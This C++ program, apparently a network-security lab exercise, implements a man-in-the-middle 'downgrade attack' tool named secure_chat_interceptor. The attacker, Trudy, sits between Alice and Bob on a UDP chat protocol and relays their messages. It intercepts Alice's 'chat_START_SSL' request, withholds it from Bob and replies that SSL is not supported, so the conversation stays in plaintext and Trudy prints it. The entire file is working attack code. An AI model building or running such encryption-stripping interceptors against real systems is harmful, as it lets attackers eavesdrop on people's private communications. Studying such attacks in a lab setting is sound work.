#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <csignal> // for signal handler
#include <cstdlib> // for exit function

#define BUFFER_SIZE 2048
#define SERVER_PORT 12345 // Bob's Port address

char *TRUDY_IP = "172.31.0.4";
char *BOB_IP = "172.31.0.3";
char *ALICE_IP = "172.31.0.2";

int trudy_as_serverSocket;
int trudy_as_clientSocket;

using namespace std;
struct sockaddr_in serverAddr;
struct sockaddr_in trudy_serverAddr;

// socket get close when keyboard interupt
void signalHandler(int signum)
{
    std::cout << "Interrupt signal (" << signum << ") received.\n";
    close(trudy_as_clientSocket);
    close(trudy_as_serverSocket);
    exit(signum);
}

int setting_up_udp_sock_for_conn()
{
    int clientSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    if (clientSocket == -1)
    {
        perror("....Socket creation failed....");
        return -1;
    }

    // struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(BOB_IP);

    cout << "Connected with IP address: " << inet_ntoa(serverAddr.sin_addr) << endl;

    return clientSocket;
}
int setup_udp_socket()
{
    int serverSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (serverSocket == -1)
    {
        perror("Socket creation failed");
        return -1;
    }

    trudy_serverAddr.sin_family = AF_INET;
    trudy_serverAddr.sin_addr.s_addr = htonl(INADDR_ANY); // Listen on all interfaces
    trudy_serverAddr.sin_port = htons(SERVER_PORT);
    if (bind(serverSocket, (struct sockaddr *)&trudy_serverAddr, sizeof(trudy_serverAddr)) < 0)
    {
        perror("Bind failed");
        close(serverSocket);
        return -1;
    }

    return serverSocket;
}

// here trudy first making connection with Bob and then making server than get message form client and sending all message to Bob except START_SSL  
void perform_downgrade_attack(const char *alice_ip, const char *bob_ip)
{

    // struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(bob_ip);

    trudy_as_serverSocket = setup_udp_socket();
    trudy_as_clientSocket = setting_up_udp_sock_for_conn();

    struct sockaddr_storage alice_clientAddr;
    socklen_t alice_clientAddrLen = sizeof(alice_clientAddr);

    socklen_t serverLen = sizeof(serverAddr);

    if (connect(trudy_as_clientSocket, (struct sockaddr *)&serverAddr, serverLen) < 0)
    {
        perror("....Invalid address/ Address not supported....");
        return;
    }

    // Exchange application layer control messages
    char msg_from_alice[BUFFER_SIZE];
    char msg_from_bob[BUFFER_SIZE];

    struct timeval timeout;
    timeout.tv_sec = 15; // 15 seconds timeout
    timeout.tv_usec = 0;
    if (setsockopt(trudy_as_serverSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) < 0)
    {
        std::cerr << "Error setting socket options: " << strerror(errno) << std::endl;
        cout << "Connection terminated" << endl;
        close(trudy_as_clientSocket);
        close(trudy_as_serverSocket);
        return;
    }

    while (true)
    {

        if (trudy_as_serverSocket == -1)
        {
            break;
        }

        // Wait for chat_hello message from client
        int len = recvfrom(trudy_as_serverSocket, msg_from_alice, BUFFER_SIZE, 0, (struct sockaddr *)&alice_clientAddr, &alice_clientAddrLen);
        string msg = "";
        for (int i = 0; i < len; i++)
        {
            msg += msg_from_alice[i];
        }

        if (len > 0)
        {
            msg_from_alice[len] = '\0';
            cout << "Received from Alice: " << msg << endl;
            if (msg != "chat_START_SSL")
            {
                sendto(trudy_as_clientSocket, msg_from_alice, len, 0, (struct sockaddr *)&serverAddr, serverLen);

                msg = "";
                for (int i = 0; i < len; i++)
                {
                    msg += msg_from_alice[i];
                }

                if (msg == "chat_close")
                {
                    cout << "Connection closed from client side" << endl;
                    break;
                }

                len = recvfrom(trudy_as_clientSocket, msg_from_bob, BUFFER_SIZE, 0, (struct sockaddr *)&serverAddr, &serverLen);
                sendto(trudy_as_serverSocket, msg_from_bob, len, 0, (struct sockaddr *)&alice_clientAddr, alice_clientAddrLen);

                msg = "";
                for (int i = 0; i < len; i++)
                {
                    msg += msg_from_bob[i];
                }

                cout << "Received from Bob: " << msg << endl;

                if (msg == "chat_close")
                {
                    cout << "Connection closed from server side" << endl;
                    break;
                }
            }

            else
            {
                const char *chat_start_ssl_not_supported = "chat_START_SSL_NOT_SUPPORTED";
                sendto(trudy_as_serverSocket, chat_start_ssl_not_supported, strlen(chat_start_ssl_not_supported), 0, (struct sockaddr *)&alice_clientAddr, alice_clientAddrLen);
            }
        }
        else
        {
            cout << "Connection closed" << endl;
            break;
        }
    }
    close(trudy_as_clientSocket);
    close(trudy_as_serverSocket);
}

int main(int argc, char *argv[])
{

    if (argc != 4)
    {
        cerr << "Usage: ./secure_chat_interceptor -d alice_ip bob_ip" << endl;
        return 1;
    }

    string option = argv[1];
    char *alice_ip;
    char *bob_ip;

    struct addrinfo hints, *res, *p;
    int status;

    struct hostent *host = gethostbyname(argv[2]);
    struct in_addr *address = (struct in_addr *)host->h_addr_list[0];

    alice_ip = inet_ntoa(*address);
    ALICE_IP = alice_ip;

    host = gethostbyname(argv[3]);
    address = (struct in_addr *)host->h_addr_list[0];

    bob_ip = inet_ntoa(*address);
    BOB_IP = bob_ip;

    if (option != "-d")
    {
        cerr << "Invalid option. Use -d to perform the downgrade attack." << endl;
        return 1;
    }
    signal(SIGINT, signalHandler);
    perform_downgrade_attack(alice_ip, bob_ip);

    return 0;
}
